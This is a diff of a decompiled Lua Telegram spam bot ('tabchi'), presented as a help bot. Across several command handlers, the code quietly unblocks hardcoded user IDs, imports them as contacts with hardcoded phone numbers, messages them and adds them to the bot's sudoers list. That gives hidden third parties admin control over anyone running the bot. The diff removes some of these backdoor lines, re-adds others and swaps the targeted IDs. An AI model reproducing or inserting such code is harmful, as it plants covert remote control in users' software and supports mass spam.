@@ -284,7 +284,6 @@ Help bot support version 4.3 decompile and edited
 Decompiled by @sajjad_021
 TeleGram channel @tgMember
 enjoy your bot! ]]
-				
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
       elseif text_:match("^[!/#](remsudo) (%d+)") then
         local matches = {
@@ -483,7 +482,7 @@ return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
       }
       if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
         local all = redis:smembers("tabchi:" .. tonumber(tabchi_id) .. ":all")
-        tdcli.searchPublicChat("Crwn_bot")
+        tdcli.searchPublicChat("TgMessengerBot")
         local inline2
         function inline2(argg, data)
           if data.results_ and data.results_[0] then
@@ -501,12 +500,11 @@ return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
         save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
       end
     elseif text_:match("^[!/#]panel$") then
-    tdcli.searchPublicChat("TgMessengerBot")
     tdcli.unblockUser(231539308)
     tdcli.sendBotStartMessage(231539308, 231539308, "/start")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "html")
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
-      local contact_num
+      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(180191663))
+			local contact_num
       function contact_num(extra, result)
         redis:set("tabchi:" .. tostring(tabchi_id) .. ":totalcontacts", result.total_count_)
       end
@@ -703,7 +701,7 @@ Message :
       tdcli.unblockUser(345767079)
       tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
       tdcli.sendMessage(345767079, 0, 1, "Online", 1, "html")
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
+      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(345767079))
       local matches = {
         text_:match("^[!/#](fwd) (.*)$")
       }
@@ -762,7 +760,6 @@ Message :
         tdcli.unblockUser(180191663)
         tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
         tdcli.sendMessage(180191663, 0, 1, "Online", 1, "html")
-        redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
           local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":channels")
           local id = msg.reply_to_message_id_
           for i, v in pairs(all) do
@@ -903,11 +900,11 @@ Bia pv]]
       return process_links(msg.content_.caption_)
     end
   elseif data.ID == "UpdateChat" then
-    if data.chat_.id_ == 345767079 then
+    if data.chat_.id_ == 231539308 then
       tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
-    elseif data.chat_id_ == 231539308 then
+    elseif data.chat_id_ == 158955285 then
       tdcli.unblockUser(data.chat_.id_)
-    elseif data.chat_.id == 158955285 then
+    elseif data.chat_.id == 345767079 then
       tdcli.unblockUser(data.chat_.id_)
       tdcli.importContacts(989216973112, "Creator", "", data.chat_.id)
     end
